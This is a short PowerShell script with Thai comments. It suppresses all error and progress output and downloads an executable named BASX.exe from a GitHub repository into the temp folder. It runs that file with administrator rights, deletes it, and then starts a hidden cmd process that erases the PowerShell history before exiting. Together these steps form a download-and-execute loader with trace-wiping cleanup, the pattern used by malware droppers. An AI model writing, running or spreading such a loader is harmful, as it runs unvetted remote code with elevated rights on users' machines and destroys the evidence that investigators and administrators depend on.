# ปิดการแจ้งเตือน Error ทุกชนิด (กันตัวแดงโผล่)
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

# 1. ตั้งค่าไฟล์
$url = "https://github.com/silentaimv1-png/basxpanel/raw/refs/heads/main/BASX.exe"
$output = "$env:TEMP\BASX.exe"

# 2. พยายามโหลดไฟล์ (ถ้าโหลดไม่ได้ให้เงียบไว้)
try {
    # ใช้ WebClient เพราะเสถียรกว่า Invoke-WebRequest ในเครื่องที่เน็ตไม่นิ่ง
    (New-Object System.Net.WebClient).DownloadFile($url, $output)
} catch {
    # แผนสำรองถ้าวิธีแรกพลาด
    Invoke-WebRequest -Uri $url -OutFile $output
}

# 3. เช็คว่าไฟล์มาจริงมั้ยก่อนรัน (กัน Error "File Not Found")
if (Test-Path $output) {
    # รันแบบ Admin และรอจนกว่าจะปิด
    Start-Process -FilePath $output -Verb RunAs -Wait
    
    # พอปิดโปรแกรมปุ๊บ ลบไฟล์ทิ้งทันที
    Remove-Item -Path $output -Force
}

# 4. ล้างประวัติ PowerShell (ใช้เทคนิค CMD สั่งลาเพื่อให้ลบได้ชัวร์)
try {
    $historyPath = (Get-PSReadlineOption).HistorySavePath
    $cleanup = "timeout /t 2 && del /f /q `"$historyPath`""
    Start-Process cmd -ArgumentList "/c $cleanup" -WindowStyle Hidden
} catch {}

# 5. ปิด PowerShell ทันที
exit
